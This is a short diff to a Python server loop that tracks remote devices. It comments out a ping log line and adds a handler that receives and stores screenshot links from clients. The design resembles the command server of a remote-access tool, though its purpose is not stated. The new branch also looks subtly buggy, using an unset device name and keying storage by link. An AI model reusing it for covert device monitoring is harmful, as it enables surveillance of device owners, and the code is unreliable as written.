@@ -34,7 +34,7 @@ while True:
     if msg.startswith(":CLIENTPING"):
         name = lines[1]           # Device name
         ip_addr = lines[2]        # IP address of the device
-        print(f"\n[>] Received ping request from {ip_addr}.")
+        #print(f"\n[>] Received ping request from {ip_addr}.")
 
         # Register new device if not already tracked
         if name not in DeviceIDList:
@@ -61,6 +61,18 @@ while True:
         if name not in response_buffer:
             response_buffer[name] = {}
         response_buffer[name]["GETINFO"] = info
+
+    # ========== Handle :SCREENSHOT ==========
+    elif msg.startswith(":SCREENSHOT"):
+        link = lines[1] #link
+
+        print(f"\n[>] Received SCREENSHOT from {name}.")
+        print(link)
+
+        # Store the response in the buffer for later retrieval
+        if link not in response_buffer:
+            response_buffer[link] = {}
+        response_buffer[link]["GETSCREENSHOT"] = link
 
     # ========== Handle :GETINFO ==========
     elif msg.startswith(":GETINFO"):
